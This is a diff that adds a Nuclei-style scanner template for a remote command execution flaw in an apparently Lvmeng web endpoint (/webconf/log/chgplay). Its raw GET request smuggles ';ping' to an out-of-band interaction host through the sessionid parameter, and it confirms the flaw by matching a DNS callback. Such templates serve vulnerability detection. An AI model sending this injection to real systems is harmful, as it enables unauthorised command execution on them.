@@ -1,0 +1,24 @@
+id: lvmeng-chgplay-rce
+
+info:
+  name: lvmeng-chgplay-rce
+  author: lvmeng-chgplay-rce
+  severity: high
+
+http:
+  - raw:
+      - |
+        GET /webconf/log/chgplay?cat=espc&sid=7473a85e535405e7bd991cb82b2f134c&status=charset&speed=10&sessionid=%3Bping%20{{interactsh-url}}%3B HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: en-US;q=0.9,en;q=0.8
+        Cache-Control: max-age=0
+        Connection: close
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
+
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
